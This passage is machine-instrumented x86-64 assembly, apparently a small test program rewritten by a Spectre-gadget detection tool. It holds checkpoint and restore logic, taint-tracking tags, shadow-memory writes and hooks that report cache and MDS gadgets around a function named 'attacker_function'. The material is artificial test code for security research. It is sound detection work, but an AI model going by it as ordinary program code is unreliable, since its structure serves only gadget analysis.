            sahf 
            movq (scratchpad+524296),%rax
            leaq (.__trampoline__0123dae6_c74c_479f_8df9_d4585205bbe3__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1206)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__0123dae6_c74c_479f_8df9_d4585205bbe3__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1206:

            nop
            jne .L_1b33

            addq $2168,%rsp
.cfi_remember_state 
.cfi_def_cfa_offset 56
            leaq (%rsp),%r12
            movq %r12,(scratchpad)
            popq %rbx
.cfi_def_cfa_offset 48
            leaq (%rsp),%r12
            movq %r12,(scratchpad+8)
            popq %rbp
.cfi_def_cfa_offset 40
            leaq (%rsp),%r12
            movq %r12,(scratchpad+16)
            popq %r12
.cfi_def_cfa_offset 32
            leaq (%rsp),%r13
            movq %r13,(scratchpad+24)
            popq %r13
.cfi_def_cfa_offset 24
            leaq (%rsp),%r15
            movq %r15,(scratchpad+32)
            popq %r14
.cfi_def_cfa_offset 16
            leaq (%rsp),%r15
            movq %r15,(scratchpad+40)
            popq %r15
.cfi_def_cfa_offset 8
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $0,(%rax)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            movabsq $scratchpad,%rax
            movabsq $35184372088832,%rcx
            movq (%rax),%rbx
            xorq %rcx,%rbx
            movb (%rbx),%bl
            movabsq $dift_reg_tags,%rdx
            movb %bl,1(%rdx)
            movq 8(%rax),%rbx
            xorq %rcx,%rbx
            movb (%rbx),%bl
            movb %bl,7(%rdx)
            movq 16(%rax),%rbx
            xorq %rcx,%rbx
            movb (%rbx),%bl
            movb %bl,12(%rdx)
            movq 24(%rax),%rbx
            xorq %rcx,%rbx
            movb (%rbx),%bl
            movb %bl,13(%rdx)
            movq 32(%rax),%rbx
            xorq %rcx,%rbx
            movb (%rbx),%bl
            movb %bl,14(%rdx)
            xorq 40(%rax),%rcx
            movb (%rcx),%al
            movb %al,15(%rdx)
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.L_1b33:

.cfi_restore_state 
            callq __stack_chk_fail@PLT
.cfi_endproc 
.size attacker_function, . - attacker_function

            nop
            nop
            nop
            nop
.align 8
#-----------------------------------
.globl main
.type main, @function
#-----------------------------------
main:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            subq $8,%rsp
            callq libcheckpoint_enable@PLT

            addq $8,%rsp
            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__indbr_transform_target_main__ec6f1844_4465_45c5_87d8_cce69d3ef136__teapot__

            endbr64 
            subq $8,%rsp
.cfi_def_cfa_offset 16
            movl $104857600,%edi
            movabsq $dift_reg_tags,%rax
            movb $0,5(%rax)
            callq set_heap_limit

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_main__c505e8ff_37cd_493e_8b89_0ea5bd9ef408__teapot__

            movl $0,%eax
            movabsq $dift_reg_tags,%rax
            movb $0,(%rax)
            callq attacker_function

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_main__85d0b8a9_4353_4380_8c1f_d9bc94ac93b6__teapot__

            movl $0,%eax
            addq $8,%rsp
.cfi_def_cfa_offset 8
            subq $8,%rsp
            callq libcheckpoint_disable@PLT

            addq $8,%rsp
            movq %rax,(scratchpad+524288)
            movabsq $dift_reg_tags,%rax
            movb $0,(%rax)
            movq (scratchpad+524288),%rax
            retq 
.cfi_endproc 

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__indbr_transform_target_main__4582e74e_8836_4a6a_909d_d2703c31d825__teapot__

            nop
            nop
.size main, . - main

            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
.align 16
#-----------------------------------
.globl __libc_csu_init
.type __libc_csu_init, @function
#-----------------------------------
__libc_csu_init:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            endbr64 
            pushq %r15
.cfi_def_cfa_offset 16
.cfi_offset 15, -16
            leaq (__frame_dummy_init_array_entry)(%rip),%r15
            pushq %r14
.cfi_def_cfa_offset 24
.cfi_offset 14, -24
            movq %rdx,%r14
            pushq %r13
.cfi_def_cfa_offset 32
.cfi_offset 13, -32
            movq %rsi,%r13
            pushq %r12
.cfi_def_cfa_offset 40
.cfi_offset 12, -40
            movl %edi,%r12d
            pushq %rbp
.cfi_def_cfa_offset 48
.cfi_offset 6, -48
            leaq (__do_global_dtors_aux_fini_array_entry)(%rip),%rbp
            pushq %rbx
.cfi_def_cfa_offset 56
.cfi_offset 3, -56
            subq %r15,%rbp
            subq $8,%rsp
.cfi_def_cfa_offset 64
            callq _init

            sarq $3,%rbp
            je .L_1bb6

            xorl %ebx,%ebx
            nop
            nop
            nop
            nop
            nop
            nop
            nop
.L_1ba0:

            movq %r14,%rdx
            movq %r13,%rsi
            movl %r12d,%edi
            callq *(%r15,%rbx,8)

            addq $1,%rbx
            cmpq %rbx,%rbp
            jne .L_1ba0
.L_1bb6:

            addq $8,%rsp
.cfi_def_cfa_offset 56
            popq %rbx
.cfi_def_cfa_offset 48
            popq %rbp
.cfi_def_cfa_offset 40
            popq %r12
.cfi_def_cfa_offset 32
            popq %r13
.cfi_def_cfa_offset 24
            popq %r14
.cfi_def_cfa_offset 16
            popq %r15
.cfi_def_cfa_offset 8
            retq 
.cfi_endproc 

            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
.size __libc_csu_init, . - __libc_csu_init
.align 16
#-----------------------------------
.globl __libc_csu_fini
.type __libc_csu_fini, @function
#-----------------------------------
__libc_csu_fini:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $255,(%rax)
            movq (scratchpad+524288),%rax
            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__indbr_transform_target___libc_csu_fini__738e53dc_024d_4dc5_a63f_51c546cafebf__teapot__

            endbr64 
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $0,(%rax)
            movq (scratchpad+524288),%rax
            retq 
.cfi_endproc 
.size __libc_csu_fini, . - __libc_csu_fini
#===================================
# end section .text
#===================================

#===================================
.section .teapot_branch_counters, "aw"
#===================================

.align 8
.__branch_counter__08a9741c_8b6a_4627_a2fd_ba42f066f656__teapot__:
.__branch_counter__9d890186_5d58_4dc5_b875_330870304b82__teapot__:
          .zero 4
.__branch_counter__0123dae6_c74c_479f_8df9_d4585205bbe3__teapot__:
.__branch_counter__3637f681_0bfd_4eb1_9855_07b1a9aa101f__teapot__:
          .zero 4
.__branch_counter__6c1a7b2a_ea4f_4e65_be97_0007a1b2e15c__teapot__:
.__branch_counter__e7bf71ac_233e_4d96_a5d9_49bd4408bafb__teapot__:
          .zero 4
.__branch_counter__fa28af4d_7400_489c_a6f6_2260c9c35214__teapot__:
.__branch_counter__001696f8_80c8_4f62_9bee_301421d5978b__teapot__:
          .zero 4
.__branch_counter__f6f5e5e5_e408_433c_abc2_049517e56f22__teapot__:
.__branch_counter__b9212420_fcfa_44cb_9e14_56097bdc3d1e__teapot__:
          .zero 4
.__branch_counter__66486815_7f0e_4589_bda2_01ad7a9bed52__teapot__:
.__branch_counter__be456ae1_c16a_45bc_a4a9_14a207f75d95__teapot__:
          .zero 4
.__branch_counter__a8f5131e_ffeb_4256_8f88_ea03495e84ce__teapot__:
.__branch_counter__2e1eb74e_d668_4c69_8752_a770c9707337__teapot__:
          .zero 4
.__branch_counter__96be25db_daab_49d1_9a80_379c0c0c1674__teapot__:
.__branch_counter__9998af03_97a2_43e5_93e5_3517e89be9d2__teapot__:
          .zero 4
.__branch_counter__969e3e57_33e8_48a3_8dab_5c922b275781__teapot__:
.__branch_counter__345bb64b_5d5d_4273_b3ab_6de102c2ffed__teapot__:
          .zero 4
.__branch_counter__520c4071_24d9_492e_b6cb_c8b84a573cbf__teapot__:
.__branch_counter__c8d8c201_2d94_4743_acb2_9d3b329d314c__teapot__:
          .zero 4
.__branch_counter__acbc9192_05a6_4210_b951_911c97f79d8a__teapot__:
.__branch_counter__eb026ad7_5c62_47cd_bd9e_40636ce4cc33__teapot__:
          .zero 4
.__branch_counter__3397588c_3241_4448_966e_9b44c092b5e5__teapot__:
.__branch_counter__29240a47_21b8_4aff_ab54_968a7ab4cd25__teapot__:
          .zero 4
.__branch_counter__138b325c_5fe9_4a1a_b86e_20f81eb2c3da__teapot__:
.__branch_counter__d9a78565_f49e_4370_ab42_4fcc3f4c2076__teapot__:
          .zero 4
.__branch_counter__0d648235_990a_4d62_8936_daa8a905a9db__teapot__:
.__branch_counter__f87dc753_2ee9_4bd6_9821_e676ccd8147d__teapot__:
          .zero 4
.__branch_counter__ae20bfba_6a9b_4b3c_9285_d5eeec099e7e__teapot__:
.__branch_counter__d4b3ab72_cc21_4c54_a149_64390f6b9b56__teapot__:
          .zero 4
.__branch_counter__8102deb9_fe07_4f28_9772_f41855e0b4e1__teapot__:
.__branch_counter__8de62071_7928_4381_a7eb_0b62b6f1f7b7__teapot__:
          .zero 4
.__branch_counter__9f7cd845_a005_4068_9b29_f581d8b4e79e__teapot__:
.__branch_counter__871aa948_cddd_4f5b_8eb7_1facbb9d78c1__teapot__:
          .zero 4
.__branch_counter__0f1a0ba5_030a_4d24_82a6_5dc94d3afaf7__teapot__:
.__branch_counter__9ed98da6_eadc_4929_9866_9d34a66fdecf__teapot__:
          .zero 4
.__branch_counter__47750739_4dbe_4b09_814d_88018b305708__teapot__:
.__branch_counter__2349f3b9_d480_4280_a9a2_353d9ea4c4c9__teapot__:
          .zero 4
.__branch_counter__b6db33d9_25b0_444c_b7e4_fcaaf5fd8af1__teapot__:
.__branch_counter__66ed920a_c1ea_40bd_9954_18d11801e056__teapot__:
          .zero 4
.__branch_counter__f44d9fb5_9124_4190_ae6b_78059fb6eaa8__teapot__:
.__branch_counter__d49eeba5_904a_4187_b78a_e46d8c7310ac__teapot__:
          .zero 4
.__branch_counter__ee029a32_d540_450c_8c2f_ddab3cb38004__teapot__:
.__branch_counter__732d7cd7_aa82_4282_ae2d_2df653e22ee0__teapot__:
          .zero 4
.__branch_counter__3f2be5c9_be44_4b3b_9ed0_cf84ebf303b7__teapot__:
.__branch_counter__70a0842c_7442_4079_80d5_8a6e361514d1__teapot__:
          .zero 4
.__branch_counter__479025d9_6ebc_4cf3_a8d3_04093a6b7dc9__teapot__:
.__branch_counter__a84f83ad_1e7c_4966_8724_0854a0275058__teapot__:
          .zero 4
.__branch_counter__3cd42740_ca65_4fa1_ac56_645963515d05__teapot__:
.__branch_counter__56a60200_76a9_4348_afec_f9d08a4fb692__teapot__:
          .zero 4
.__branch_counter__0c647829_3f6e_424c_8bc4_eec8c4caa290__teapot__:
.__branch_counter__73454647_e019_4b26_ac47_096045cba6c2__teapot__:
          .zero 4
.__branch_counter__2d8b2904_dc58_4a0a_bf26_858b40035890__teapot__:
.__branch_counter__a0b2349d_d497_44ab_adc1_f79988d7df99__teapot__:
          .zero 4
.__branch_counter__3a392698_d00d_43c5_a4bb_0b58dafc3b41__teapot__:
.__branch_counter__19a633a3_58ec_450c_a1a7_e5cecca00a47__teapot__:
          .zero 4
.__branch_counter__31500b1f_dd7d_45c8_8bf8_60e62467f1b2__teapot__:
.__branch_counter__ef3bf9f5_b46a_4d7a_9b10_8b9b47f68315__teapot__:
          .zero 4
.__branch_counter__4657c448_5658_48f1_aed9_4ee4ad5a94b3__teapot__:
.__branch_counter__b88d08a0_3a05_4252_8951_2ed6bfab4973__teapot__:
          .zero 4
.__branch_counter__643980ef_5071_4300_a67b_3238470ceaf1__teapot__:
.__branch_counter__f3d0f919_f7e0_480f_9dfd_b16b351dfcd9__teapot__:
          .zero 4
.__branch_counter__c362d663_c2e2_43fc_a017_845a8fca99b0__teapot__:
.__branch_counter__b8e70c93_4c51_48a8_b0b2_7b514a43b309__teapot__:
          .zero 4
.__branch_counter__a443664a_f1ad_4fd9_a559_5be26ad24f64__teapot__:
.__branch_counter__0fb98d1e_c46e_40b6_a492_bc4dd330d8a3__teapot__:
          .zero 4
#===================================
# end section .teapot_branch_counters
#===================================

#===================================
.section .note.gnu.build-id ,"a"
#===================================

.align 4
          .byte 0x4
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x14
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x3
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x47
          .byte 0x4e
          .byte 0x55
          .byte 0x0
          .byte 0x12
          .byte 0xf2
          .byte 0x1f
          .byte 0xc4
          .byte 0xac
          .byte 0x2c
          .byte 0xdd
          .byte 0xc3
          .byte 0x89
          .byte 0x4c
          .byte 0x45
          .byte 0x63
          .byte 0x7f
          .byte 0x53
          .byte 0x4c
          .byte 0x52
          .byte 0xc4
          .byte 0x87
          .byte 0x9a
          .byte 0x1
#===================================
# end section .note.gnu.build-id
#===================================
#-----------------------------------
.weak _ITM_deregisterTMCloneTable
.type _ITM_deregisterTMCloneTable, @notype
#-----------------------------------
#-----------------------------------
.weak _ITM_registerTMCloneTable
.type _ITM_registerTMCloneTable, @notype
#-----------------------------------
#-----------------------------------
#.symver __assert_fail,__assert_fail@GLIBC_2.2.5
.globl __assert_fail
.type __assert_fail, @function
#-----------------------------------
#-----------------------------------
#.symver __ctype_b_loc,__ctype_b_loc@GLIBC_2.3
.globl __ctype_b_loc
.type __ctype_b_loc, @function
#-----------------------------------
#-----------------------------------
#.symver __cxa_finalize,__cxa_finalize@GLIBC_2.2.5
.weak __cxa_finalize
.type __cxa_finalize, @function
#-----------------------------------
#-----------------------------------
.weak __gmon_start__
.type __gmon_start__, @notype
#-----------------------------------
#-----------------------------------
#.symver __libc_start_main,__libc_start_main@GLIBC_2.2.5
.globl __libc_start_main
.type __libc_start_main, @function
#-----------------------------------
#-----------------------------------
#.symver __printf_chk__dift_wrapper__,__printf_chk__dift_wrapper__@GLIBC_2.3.4
.globl __printf_chk__dift_wrapper__
.type __printf_chk__dift_wrapper__, @function
#-----------------------------------
#-----------------------------------
.globl __sanitizer_cov_trace_pc
.type __sanitizer_cov_trace_pc, @function
#-----------------------------------
#-----------------------------------
.globl __sanitizer_cov_trace_pc_guard
.type __sanitizer_cov_trace_pc_guard, @function
#-----------------------------------
#-----------------------------------
#.symver __stack_chk_fail,__stack_chk_fail@GLIBC_2.4
.globl __stack_chk_fail
.type __stack_chk_fail, @function
#-----------------------------------
#-----------------------------------
.globl checkpoint_cnt
.type checkpoint_cnt, @function
#-----------------------------------
#-----------------------------------
.globl checkpoint_target_metadata
.type checkpoint_target_metadata, @function
#-----------------------------------
#-----------------------------------
.globl dift_reg_queued_id
.type dift_reg_queued_id, @function
#-----------------------------------
#-----------------------------------
.globl dift_reg_queued_tag
.type dift_reg_queued_tag, @function
#-----------------------------------
#-----------------------------------
.globl dift_reg_tags
.type dift_reg_tags, @function
#-----------------------------------
#-----------------------------------
#.symver exit,exit@GLIBC_2.2.5
.globl exit
.type exit, @function
#-----------------------------------
#-----------------------------------
#.symver free,free@GLIBC_2.2.5
.globl free
.type free, @function
#-----------------------------------
#-----------------------------------
.globl guard_list_top
.type guard_list_top, @function
#-----------------------------------
#-----------------------------------
.globl instruction_cnt
.type instruction_cnt, @function
#-----------------------------------
#-----------------------------------
.globl libcheckpoint_disable
.type libcheckpoint_disable, @function
#-----------------------------------
#-----------------------------------
.globl libcheckpoint_enable
.type libcheckpoint_enable, @function
#-----------------------------------
#-----------------------------------
.globl make_checkpoint
.type make_checkpoint, @function
#-----------------------------------
#-----------------------------------
#.symver malloc,malloc@GLIBC_2.2.5
.globl malloc
.type malloc, @function
#-----------------------------------
#-----------------------------------
#.symver memcpy__dift_wrapper__,memcpy__dift_wrapper__@GLIBC_2.14
.globl memcpy__dift_wrapper__
.type memcpy__dift_wrapper__, @function
#-----------------------------------
#-----------------------------------
.globl memory_history_top
.type memory_history_top, @function
#-----------------------------------
#-----------------------------------
#.symver memset__dift_wrapper__,memset__dift_wrapper__@GLIBC_2.2.5
.globl memset__dift_wrapper__
.type memset__dift_wrapper__, @function
#-----------------------------------
#-----------------------------------
#.symver mmap,mmap@GLIBC_2.2.5
.globl mmap
.type mmap, @function
#-----------------------------------
#-----------------------------------
#.symver munmap,munmap@GLIBC_2.2.5
.globl munmap
.type munmap, @function
#-----------------------------------
#-----------------------------------
.globl old_rsp
.type old_rsp, @function
#-----------------------------------
#-----------------------------------
#.symver perror,perror@GLIBC_2.2.5
.globl perror
.type perror, @function
#-----------------------------------
#-----------------------------------
#.symver puts,puts@GLIBC_2.2.5
.globl puts
.type puts, @function
#-----------------------------------
#-----------------------------------
#.symver realloc,realloc@GLIBC_2.2.5
.globl realloc
.type realloc, @function
#-----------------------------------
#-----------------------------------
.globl report_gadget_KASPER_CACHE
.type report_gadget_KASPER_CACHE, @function
#-----------------------------------
#-----------------------------------
.globl report_gadget_KASPER_MDS
.type report_gadget_KASPER_MDS, @function
#-----------------------------------
#-----------------------------------
.globl report_gadget_KASPER_PORT
.type report_gadget_KASPER_PORT, @function
#-----------------------------------
#-----------------------------------
.globl report_gadget_SPECFUZZ_ASAN_READ
.type report_gadget_SPECFUZZ_ASAN_READ, @function
#-----------------------------------
#-----------------------------------
.globl report_gadget_SPECFUZZ_ASAN_WRITE
.type report_gadget_SPECFUZZ_ASAN_WRITE, @function
#-----------------------------------
#-----------------------------------
.globl report_gadget_SPECTAINT_BCB
.type report_gadget_SPECTAINT_BCB, @function
#-----------------------------------
#-----------------------------------
.globl report_gadget_SPECTAINT_BCBS
.type report_gadget_SPECTAINT_BCBS, @function
#-----------------------------------
#-----------------------------------
.globl restore_checkpoint_EXT_LIB
.type restore_checkpoint_EXT_LIB, @function
#-----------------------------------
#-----------------------------------
.globl restore_checkpoint_MALFORMED_INDIRECT_BR
.type restore_checkpoint_MALFORMED_INDIRECT_BR, @function
#-----------------------------------
#-----------------------------------
.globl restore_checkpoint_ROB_LEN
.type restore_checkpoint_ROB_LEN, @function
#-----------------------------------
#-----------------------------------
.globl scratchpad
.type scratchpad, @function
#-----------------------------------
#-----------------------------------
.globl scratchpad_rsp
.type scratchpad_rsp, @function
#-----------------------------------
#-----------------------------------
#.symver setrlimit__dift_wrapper__,setrlimit__dift_wrapper__@GLIBC_2.2.5
.globl setrlimit__dift_wrapper__
.type setrlimit__dift_wrapper__, @function
#-----------------------------------
